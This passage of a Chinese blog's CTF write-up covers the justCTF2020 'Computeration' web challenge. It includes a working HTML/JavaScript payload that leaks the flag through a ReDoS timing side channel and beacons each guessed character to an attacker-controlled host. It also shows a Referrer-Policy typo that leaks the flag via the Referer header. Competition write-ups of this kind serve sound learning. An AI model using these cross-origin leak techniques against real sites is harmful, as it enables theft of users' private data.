+<h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>最后还是znj师傅，lgw和AA牛逼，使用ReDOS把flag盲注出来了，还记得龚老师以前说过js单线程容易受到ReDOS攻击，消耗太多时间在正则匹配上导致的拒绝服务<br>只要构造出能够导致js正则反复匹配的payload，再使用正向肯定预查，在正向肯定查找内容不符合时直接得出不匹配的结论结束正则过程。如下payload自己触发能导致一个超长延时，虽然不会导致浏览器崩溃，但是如果字符对上了那个页面会卡个30s+才会去尝试下一个字符<del>一开始HTML写的是普通版的但是提交提交到了fix版本的bot上，整了一天都不对。。我真是傻逼</del>，后来改回来之后发现，字符会有缺失，并且还会是乱序，不过确实能收到对应的最后一个字符，反正每次取最大的字符就是对的了（bot在页面加载完成后就关闭页面了，不知道这个是不是发到一半就结束的原因）</p>
+<h4 id="坑点"><a href="#坑点" class="headerlink" title="坑点"></a>坑点</h4><p>有一个点，一开始直接用的for循环加直接更改iframe的src，结果是完全不成功，可能的原因是iframe还没加载完就给我变来变去的了，所以要使用onload，等他加载完了再去操作<br>开一个iframe然后反复修改iframe的src也能触发onhashchange</p>
+<h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>test<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>report<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>img</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://ip:10010<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>img</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">
+    key<span class="token operator">=</span><span class="token string">'abcdefghijklmnopqrstuvwxyz_$'</span><span class="token punctuation">;</span>
+    iframe<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    n<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
+     f1<span class="token operator">=</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        iframe<span class="token punctuation">.</span>src<span class="token operator">=</span><span class="token string">'https://computeration.web.jctf.pro/?'</span><span class="token operator">+</span>n<span class="token operator">+</span><span class="token string">'#'</span><span class="token punctuation">;</span>
+        iframe<span class="token punctuation">.</span>onload<span class="token operator">=</span>f2<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    f2<span class="token operator">=</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        iframe<span class="token punctuation">.</span>src<span class="token operator">+</span><span class="token operator">=</span><span class="token string">'^(?=justCTF\\{'</span><span class="token operator">+</span>key<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">')((((.*)*)*)*)*233'</span><span class="token punctuation">;</span>
+        <span class="token comment" spellcheck="true">//iframe.src+='^(?=justCTF\\{cross_origin_timing_lol\\})((.*)*)*233';</span>
+        <span class="token comment" spellcheck="true">//iframe.src+='^(?=justCTF\\{no_referer_typo_ehhhhhh\\})((((.*)*)*)*)*233';</span>
+        document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'report'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>src<span class="token operator">=</span><span class="token string">'http://ip/jctf?'</span><span class="token operator">+</span>key<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">;</span>
+        n<span class="token operator">+</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span>n<span class="token operator">>=</span>key<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">;</span>
+        <span class="token function">f1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    iframe<span class="token punctuation">.</span>src<span class="token operator">=</span><span class="token string">'https://computeration.web.jctf.pro/?0#'</span><span class="token punctuation">;</span>
+    iframe<span class="token punctuation">.</span>onload<span class="token operator">=</span>f2<span class="token punctuation">;</span>
+</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span>
+</code></pre>
+<h3 id="非预期-1"><a href="#非预期-1" class="headerlink" title="非预期"></a>非预期</h3><p>出题人在写Referrer-policy的时候打错了，写成了<code>no-referer</code>，事实上应该是<code>no-referrer</code>，这样子Referrer-Policy就变成了默认的<code>no-referrer-when-downgrade</code>，只有在https发送到http时不发送Referer字段<br>所以如果直接给bot一个https请求，并查看发来的Referer字段，就能直接看见flag。。。</p>
+<pre class=" language-http"><code class="language-http"><span class="token response-status">HTTP/1.1 <span class="token property">200 OK</span></span>
+<span class="token header-name keyword">Content-Length:</span> 232
+<span class="token header-name keyword">Content-Type:</span> text/html; charset=utf-8
+<span class="token header-name keyword">Date:</span> Wed, 10 Feb 2021 04:21:49 GMT
+<span class="token header-name keyword">Etag:</span> W/"e8-FVyP6J4mzbAHkD6jTxmCNIW9HoY"
+<span class="token header-name keyword">Referrer-Policy:</span> no-referer
+<span class="token header-name keyword">Server:</span> Caddy
+<span class="token header-name keyword">X-Powered-By:</span> Express
+<span class="token header-name keyword">Connection:</span> close<span class="token text/html">
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">
+    
+    localStorage<span class="token punctuation">.</span><span class="token function">setItem</span><span class="token punctuation">(</span><span class="token string">'notes'</span><span class="token punctuation">,</span>JSON<span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">{</span>
+        title<span class="token punctuation">:</span><span class="token string">'flag'</span><span class="token punctuation">,</span>
+        content<span class="token punctuation">:</span><span class="token string">'justCTF{cross_origin_timing_lol}'</span>
+    <span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    
+    location <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>location<span class="token punctuation">.</span>href<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>searchParams<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'url'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+</span></code></pre>
+<p>不过不是很想的通为什么bot要这么访问出来，我一开始直接初始化一个localStorage然后来一个链接让bot访问一个链接，不就没这个事了？</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="external nofollow noopener noreferrer" href="http://www.lmxspace.com/2019/02/16/ReDOS%E5%88%9D%E6%8E%A2/">ReDOS初探</a><br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://zhuanlan.zhihu.com/p/46294360">一个由正则表达式引发的血案</a><br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://liotree.github.io/2020/07/13/TSG-CTF%E5%A4%8D%E7%8E%B0/index.html">TSG-CTF复现</a><br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://yanluow.github.io/2021/02/04/justCTF2020%E9%A2%98%E7%9B%AEComputeration%E5%88%86%E6%9E%90/">Computeration的wp</a><br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://hackmd.io/@terjanq/justCTF2020-writeups">justCTF2020出题人wp</a><br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://m.yisu.com/zixun/133254.html">PHP中ob缓存的应用</a><br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.jianshu.com/p/43ff69d076e3">JS跨域–window.name</a><br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://blog.brycec.me/posts/justctf2020_writeups/">justCTF2020wp</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/wp/" rel="tag"># wp</a>
+              <a href="/tags/XSS/" rel="tag"># XSS</a>
+              <a href="/tags/Golang/" rel="tag"># Golang</a>
+              <a href="/tags/ReDoS/" rel="tag"># ReDoS</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.html" rel="prev" title="域环境搭建">
+      <i class="fa fa-chevron-left"></i> 域环境搭建
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/Mimikatz%E4%BD%BF%E7%94%A8%E7%AE%80%E7%95%A5.html" rel="next" title="mimikatz简单使用手册">
+      mimikatz简单使用手册 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#justCTF2020"><span class="nav-number">1.</span> <span class="nav-text">justCTF2020</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Forgotten-name"><span class="nav-number">1.1.</span> <span class="nav-text">Forgotten name</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Go-fs"><span class="nav-number">1.2.</span> <span class="nav-text">Go-fs</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%AF%94%E8%B5%9B%E7%BB%93%E6%9D%9F%E7%9C%8Bwp"><span class="nav-number">1.2.1.</span> <span class="nav-text">比赛结束看wp</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%9D%9E%E9%A2%84%E6%9C%9F"><span class="nav-number">1.2.1.1.</span> <span class="nav-text">非预期</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%A2%84%E6%9C%9F"><span class="nav-number">1.2.1.2.</span> <span class="nav-text">预期</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Baby-CSP"><span class="nav-number">1.3.</span> <span class="nav-text">Baby CSP</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BA%90%E7%A0%81"><span class="nav-number">1.3.1.</span> <span class="nav-text">源码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9C%8BWP"><span class="nav-number">1.3.2.</span> <span class="nav-text">看WP</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#warning%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E8%A6%86%E7%9B%96header"><span class="nav-number">1.3.2.1.</span> <span class="nav-text">warning缓冲区溢出覆盖header</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#23%E9%95%BF%E5%BA%A6XSS"><span class="nav-number">1.3.2.2.</span> <span class="nav-text">23长度XSS</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Window-name"><span class="nav-number">1.3.2.3.</span> <span class="nav-text">Window.name</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#update"><span class="nav-number">1.3.3.</span> <span class="nav-text">update</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Computeration"><span class="nav-number">1.4.</span> <span class="nav-text">Computeration</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#DOM-XSS"><span class="nav-number">1.4.1.</span> <span class="nav-text">DOM XSS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#location-hash"><span class="nav-number">1.4.2.</span> <span class="nav-text">location.hash</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#innerHTML"><span class="nav-number">1.4.3.</span> <span class="nav-text">innerHTML</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#localStorage"><span class="nav-number">1.4.4.</span> <span class="nav-text">localStorage</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E8%A7%A3"><span class="nav-number">1.4.5.</span> <span class="nav-text">题解</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9D%91%E7%82%B9"><span class="nav-number">1.4.5.1.</span> <span class="nav-text">坑点</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#payload"><span class="nav-number">1.4.5.2.</span> <span class="nav-text">payload</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%9D%9E%E9%A2%84%E6%9C%9F-1"><span class="nav-number">1.4.6.</span> <span class="nav-text">非预期</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-number">1.5.</span> <span class="nav-text">参考链接</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Z3ratu1" src="https://q2.qlogo.cn/headimg_dl?dst_uin=1207039417&spec=160">
+  <p class="site-author-name" itemprop="name">Z3ratu1</p>
+  <div class="site-description" itemprop="description">与其感慨路难行，不如现在出发</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">145</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">86</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+  <div class="beian"><a href="http://www.beian.miit.gov.cn/" rel="external nofollow noopener noreferrer" target="_blank">湘ICP备2020021580号 </a>
+      <img src="/./images/beian.png" style="display: inline-block;">
+  </div>
+
+<div class="copyright">
+  
+  &copy; 2019 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Z3ratu1</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="external nofollow noopener noreferrer" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="external nofollow noopener noreferrer" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : '7H8kg0XdWO8IbhOcu4K1JaAT-gzGzoHsz',
+      appKey     : 'wPKQjkbVtvPaRR7gh2yjfLSi',
+      placeholder: "Just go go",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : true,
+      lang       : '' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
